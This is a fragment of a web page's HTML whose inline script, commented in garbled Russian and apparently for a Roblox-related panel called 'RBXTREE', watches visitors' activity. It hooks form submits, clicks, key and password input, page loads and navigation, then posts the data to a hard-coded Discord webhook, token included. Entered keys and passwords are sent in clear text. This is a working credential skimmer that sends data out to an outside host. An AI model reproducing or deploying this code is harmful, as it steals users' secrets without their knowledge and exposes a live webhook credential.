<body>
<noscript>

<div id="app"></div>

<script>
    // –í–µ–±—Ö—É–∫ Discord –¥–ª—è –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ';

    // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤ –≤ Discord
    function sendToDiscord(action, details = {}) {
        const timestamp = new Date().toISOString();
        const userAgent = navigator.userAgent;
        const pageUrl = window.location.href;
        const ip = details.ip || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

        // –§–æ—Ä–º–∏—Ä—É–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
        const embed = {
            title: `üìù –õ–æ–≥ –¥–µ–π—Å—Ç–≤–∏—è: ${action}`,
            color: 0x3498db,
            fields: [
                {
                    name: "‚è∞ –í—Ä–µ–º—è",
                    value: timestamp,
                    inline: true
                },
                {
                    name: "üåê –°—Ç—Ä–∞–Ω–∏—Ü–∞",
                    value: pageUrl,
                    inline: true
                },
                {
                    name: "üîë –î–µ–π—Å—Ç–≤–∏–µ",
                    value: action,
                    inline: true
                }
            ],
            timestamp: timestamp
        };

        // –î–æ–±–∞–≤–ª—è–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –¥–µ–π—Å—Ç–≤–∏—è
        if (details.key) {
            embed.fields.push({
                name: "üîê –í–≤–µ–¥–µ–Ω–Ω—ã–π –∫–ª—é—á",
                value: `\`${details.key}\``,
                inline: false
            });
        }

        if (details.userId) {
            embed.fields.push({
                name: "üë§ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è",
                value: details.userId,
                inline: true
            });
        }

        if (details.success !== undefined) {
            embed.color = details.success ? 0x2ecc71 : 0xe74c3c;
            embed.fields.push({
                name: "‚úÖ –°—Ç–∞—Ç—É—Å",
                value: details.success ? "–£—Å–ø–µ—à–Ω–æ" : "–û—à–∏–±–∫–∞",
                inline: true
            });
        }

        if (details.error) {
            embed.fields.push({
                name: "‚ùå –û—à–∏–±–∫–∞",
                value: details.error,
                inline: false
            });
        }

        embed.fields.push({
            name: "üñ•Ô∏è User Agent",
            value: `\`${userAgent.substring(0, 1024)}\``,
            inline: false
        });

        // –û—Ç–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ fetch
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [embed]
            })
        }).catch(error => {
            console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞ –≤ Discord:', error);
        });
    }

    // –ü–µ—Ä–µ—Ö–≤–∞—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º
    document.addEventListener('submit', function(event) {
        setTimeout(() => {
            const form = event.target;
            const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[type="key"]');
            
            inputs.forEach(input => {
                if (input.value && (input.name.toLowerCase().includes('key') || 
                    input.type === 'password' || 
                    input.placeholder.toLowerCase().includes('key') ||
                    input.id.toLowerCase().includes('key'))) {
                    
                    // –õ–æ–≥–∏—Ä—É–µ–º –≤–≤–æ–¥ –∫–ª—é—á–∞
                    sendToDiscord('–í–≤–æ–¥ –∫–ª—é—á–∞', {
                        key: input.value,
                        formId: form.id || '–±–µ–∑ ID',
                        formAction: form.action || '–±–µ–∑ action'
                    });
                }
            });
        }, 100);
    });

    // –ü–µ—Ä–µ—Ö–≤–∞—Ç –∫–ª–∏–∫–æ–≤ –Ω–∞ –∫–Ω–æ–ø–∫–∏
    document.addEventListener('click', function(event) {
        const target = event.target;
        
        // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–æ–∫ –≤—Ö–æ–¥–∞, –æ—Ç–ø—Ä–∞–≤–∫–∏ –∏ —Ç.–¥.
        if (target.tagName === 'BUTTON' || 
            (target.tagName === 'INPUT' && target.type === 'submit') ||
            target.classList.contains('btn') ||
            target.classList.contains('button') ||
            target.textContent.toLowerCase().includes('submit') ||
            target.textContent.toLowerCase().includes('login') ||
            target.textContent.toLowerCase().includes('enter') ||
            target.value.toLowerCase().includes('submit') ||
            target.value.toLowerCase().includes('login')) {
            
            const buttonText = target.textContent || target.value || target.innerHTML;
            sendToDiscord('–ù–∞–∂–∞—Ç–∏–µ –∫–Ω–æ–ø–∫–∏', {
                buttonText: buttonText.substring(0, 100),
                buttonId: target.id || '–±–µ–∑ ID',
                buttonClass: target.className || '–±–µ–∑ –∫–ª–∞—Å—Å–∞'
            });
        }
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    window.addEventListener('load', function() {
        sendToDiscord('–ó–∞–≥—Ä—É–∑–∫–∞ –ø–∞–Ω–µ–ª–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è', {
            pageTitle: document.title,
            referrer: document.referrer || '–ø—Ä—è–º–æ–π –≤—Ö–æ–¥'
        });
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–∑–º–µ–Ω–µ–Ω–∏–π –≤ –ø–æ–ª—è—Ö –≤–≤–æ–¥–∞ (—Å –∑–∞–¥–µ—Ä–∂–∫–æ–π)
    let keyInputTimer;
    document.addEventListener('input', function(event) {
        const target = event.target;
        
        // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª–µ –ø–æ–ª–µ–º –¥–ª—è –∫–ª—é—á–∞/–ø–∞—Ä–æ–ª—è
        if ((target.type === 'password' || 
             target.name.toLowerCase().includes('key') ||
             target.placeholder.toLowerCase().includes('key') ||
             target.id.toLowerCase().includes('key')) && 
            target.value.length > 3) {
            
            clearTimeout(keyInputTimer);
            keyInputTimer = setTimeout(() => {
                sendToDiscord('–í–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö –≤ –ø–æ–ª–µ –∫–ª—é—á–∞', {
                    fieldType: target.type,
                    fieldName: target.name || '–±–µ–∑ –∏–º–µ–Ω–∏',
                    fieldId: target.id || '–±–µ–∑ ID',
                    valueLength: target.value.length,
                    firstChars: target.value.substring(0, 3) + '...'
                });
            }, 2000);
        }
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—à–∏–±–æ–∫ JavaScript
    window.addEventListener('error', function(event) {
        sendToDiscord('–û—à–∏–±–∫–∞ JavaScript', {
            error: event.message,
            filename: event.filename,
            lineno: event.lineno,
            colno: event.colno
        });
    });

    // –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–µ—Ä–µ—Ö–æ–¥–æ–≤ (–µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è History API)
    const originalPushState = history.pushState;
    history.pushState = function(state, title, url) {
        originalPushState.apply(this, arguments);
        sendToDiscord('–ü–µ—Ä–µ—Ö–æ–¥ –ø–æ —Å—Ç—Ä–∞–Ω–∏—Ü–µ', {
            newUrl: url || '–Ω–µ —É–∫–∞–∑–∞–Ω',
            pageTitle: title || document.title
        });
    };

    console.log('–°–∏—Å—Ç–µ–º–∞ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è RBXTREE –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞');
    
    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ä—É—á–Ω–æ–≥–æ –ª–æ–≥–≥–∏—Ä–æ–≤–∞–Ω–∏—è –∏–∑ –¥—Ä—É–≥–∏—Ö —Å–∫—Ä–∏–ø—Ç–æ–≤
    window.logRBXAction = function(action, details) {
        sendToDiscord(action, details);
    };
</script>
